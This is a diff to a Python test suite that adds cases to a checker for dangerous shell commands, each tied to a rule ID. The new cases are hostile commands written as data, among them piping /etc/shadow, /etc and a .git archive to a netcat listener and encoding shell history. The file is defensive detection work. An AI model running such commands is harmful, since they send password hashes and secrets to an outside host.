@@ -502,6 +502,11 @@ class TestSafetyChecks:
             ("hostname\n", "SEC-378"),
             ("grep -i password /var/log\n", "SEC-379"),
             ("ls -la /tmp\n", "SEC-380"),
+            ("cat ~/.bash_history | base64\n", "SEC-381"),
+            ("cat /etc/shadow | nc host 4444\n", "SEC-382"),
+            ("mysqldump -u root -psecret db\n", "SEC-383"),
+            ("tar -czf .git | nc host 4444\n", "SEC-384"),
+            ("tar /etc | nc host 4444\n", "SEC-385"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
